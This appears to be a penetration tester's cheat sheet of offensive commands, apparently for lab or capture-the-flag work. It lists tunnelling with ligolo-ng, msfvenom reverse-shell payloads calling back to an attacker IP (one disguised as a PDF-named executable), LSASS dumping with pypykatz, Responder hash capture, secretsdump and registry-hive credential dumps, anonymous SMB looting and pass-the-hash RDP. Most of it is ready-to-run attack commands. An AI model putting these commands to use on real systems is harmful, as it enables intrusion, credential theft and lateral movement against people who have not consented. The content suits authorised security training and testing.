name: ligolo-ng
description:
An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.
Once an agent connects. Interact with it:
- sessions
- <ENTER>
- start

commands.command:
ip tuntap add user kali mode tun ligolo
ip link set ligolo up
./proxy -selfcert
ip route add $IP/24 dev ligolo
commands.description: Setup interface and start ligolo-ng server.
Agent connects to attacker.

name: MSFVenom
description: Msfvenom is a standalone payload generator. From the Metasploit framework.

commands.command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
commands.description: Stageless Linux Payload

commands.command: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
commands.description: Stageless Windows Payload

name: nmap
description: Discover open ports

commands.description: Default scan with scripts
Full scan

name: pypykatz
description: Mimikatz implementation in pure Python

commands.command:
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp
commands.description: Dump lsass process (PID 672) and parse it with pypykatz.

name: Responder
description: Man in the middle to catch NTLM hashes. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes.

commands.description: Start responder on teh interface tun0.

name: secretsdump.py
description: Impacket secretsdump.py can dump SAM secrets remotely or local.

commands.description: Dump secrets from a normal Windows box.

commands.command: secretsdump.py -ntds ntds.dit system system.save -hashes lmhash:nthash LOCAL
commands.description: Dump secrest from a Domain Controller
DCSync Domain Administrator or similar privileges are required!

commands.command:
reg.exe save hklm\sam C:\Windows\Temp\sam.save
reg.exe save hklm\system C:\Windows\Temp\system.save
reg.exe save hklm\security C:\Windows\Temp\security.save
commands.description: Dump registry hives, or get them somehow (SeBackupPrivilege)

name: SharpHound
description: Collect Bloodhound information with SharpHound.exe

commands.description: Execute SharpHound locally on a compromised system. (Noisy)

name: smbclient
description: ftp-like client to access SMB/CIFS resources on servers.

commands.description: Anonymous enumeration of smb shares
Anonymous enumeration of smb shares

commands.command:
smbclient //$IP/Development -U $DOMAIN/anonymous
recurse ON
prompt OFF
mget *
commands.description: Connect to SMB share Development and recursively download everything.

name: VHost
description: Enumerating vhosts via web.

commands.description: Vhost web enumeration with ffuf, change -fc parameter.

name: xfreerdp
description: Linux RDP client

commands.description: RDP session with dynamic-resolution and mounted drive.

commands.command:
# add this key
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:$IP /u:$USERNAME /pth:$HASH /dynamic-resolution /drive:/mnt/www
commands.description: PTH RDP session
